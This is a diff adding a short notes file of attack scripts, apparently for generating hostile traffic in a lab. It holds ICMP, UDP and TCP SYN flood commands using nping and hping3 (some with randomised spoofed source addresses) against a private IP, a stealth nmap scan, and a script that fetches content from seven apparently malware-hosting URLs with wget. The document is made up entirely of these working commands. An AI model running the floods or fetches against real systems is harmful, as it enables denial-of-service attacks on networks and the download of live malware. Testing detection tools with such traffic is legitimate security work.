@@ -1,0 +1,26 @@
+create files
+ICMP-FlOOD-DOS.sh
+sudo nping --icmp 192.168.254.99 --rate 210 -c 1000000
+
+create files
+IP-Spoof.sh
+sudo hping3 -1 -c 1000 192.168.254.99 --rand-source -i u3000
+
+TCP-SCAN.sh
+sudo nmap -v -sS 172.16.105.105
+
+Malware-Domain.sh
+wget http://andarealestate.com.au/kqmfgn/PTNzCb/ -T 5 -t 1
+wget http://afriquelemou.free.fr//templates/js_jamba/cs.php -T 5 -t 1
+wget http://bolehprediksi.com/wp-includes/tWsI/ -T 5 -t 1
+wget http://restaurantes.capicapi.cr/wp-admin/z5s6ua1pyk/ -T 5 -t 1
+wget http://niholzamin.dst.uz/wp-includes/6x8s90y-kkrjt-976702/ -T 5 -t 1
+wget http://rahatsozluk.com/6s0r3sk/wYgBh -T 5 -t 1
+wget https://custompaintingus.com -T 5 -t 1
+
+udp-flood-zp.sh
+sudo hping3 --flood 192.168.254.99 --rand-source --udp -c 10000
+
+TCP-SYN-ATTACK-DDOS.sh
+sudo nping --tcp --flags SYN -p 80 192.168.254.99 --rate 210 -c 100000
+
